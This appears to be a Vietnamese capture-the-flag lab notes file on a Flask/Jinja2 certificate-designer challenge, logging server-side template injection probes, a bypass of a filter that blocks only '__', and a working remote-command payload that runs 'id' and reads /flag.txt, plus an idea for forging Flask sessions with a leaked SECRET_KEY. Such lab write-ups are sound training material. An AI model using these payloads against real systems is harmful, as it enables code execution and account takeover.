# notes.md - merged

Instance: `f3f0bac2-5765-merged-fa7dc.mystery-challenges.webverselabs-pro.com` (đã stop).
Sink: `POST /designer/preview`, field `body`. Cờ dạng `WEBVERSE{...}`.

## H1 - Endpoint GraphQL/API?
(đã loại ở bài BartBrack, không áp dụng cho bài này - Certmarq là PHP/Flask render HTML)

## H1 - Fingerprint engine qua preview
cmd: `POST /designer/preview` với `{{7*7}}`, `{{7*'7'}}`, `${7*7}`, `{{ ''|class }}`
evidence: `49`, `7777777`, không đổi, `TemplateAssertionError`
result: OK - Jinja2/Flask, render bằng `render_template_string`

## H2 - Dò ranh giới content filter
cmd: `{{config.items()}}`, `{{session}}`, `{{ ''.__class__ }}`, `{{_}}`, `{{cycler}}`, `{{lipsum}}`,
     `{{request}}`, `{{ [].pop }}`, `{% print(1) %}`
evidence: mọi thứ đều render được; **chỉ** request chứa chuỗi `__` bị từ chối với message
  *the pattern "__" is not allowed in certificate templates*.
  Phần thưởng phụ: `SECRET_KEY` lộ qua config, `uid` lộ qua `{{session}}`
result: OK - blacklist đúng một token, bypass được

## H3 - Bypass bằng dunder dựng từ query string
cmd: body `{{(lipsum|attr(request.args.g))['os'].popen(request.args.c).read()}}` + `?g=__globals__&c=id`
evidence: log/trang preview trả `uid=33(www-data) gid=33(www-data)`; `c=cat /flag.txt` trả cờ
result: OK - RCE đọc file

## H4 - Xác nhận từ phía đề
cmd: `cat /entrypoint.sh` qua cùng RCE
evidence: "Direct, unsandboxed Jinja2 SSTI: the designer preview (POST /designer/preview) renders
  the issuer's certificate body with render_template_string, so a standard Jinja2 RCE chain reads /flag.txt"
result: OK - khớp chính xác chuỗi đã dùng

## Hướng phụ chưa đi (ghi lại để lần sau)
`SECRET_KEY` + `{{session}}` cho thấy có thể giả session Flask đổi `uid` sang user khác (admin) mà
không cần RCE - nếu cờ nằm trong dữ liệu của issuer khác thì đó mới là đường chính. Ở đây cờ nằm ở
`/flag.txt` nên RCE ngắn hơn.

## Tính trung thực của hồ sơ
`exploit.py` **không có** ở đây: script `requests` đã viết nhưng chưa chạy thành công lần nào -
lúc thử lại thì instance đã bị stop vì WebVerse chỉ chạy một instance cùng lúc, và tên field thật
của form `/register` chưa kịp xác nhận. Chuỗi đã verify là snippet JS trong `analysis/payload.md`.
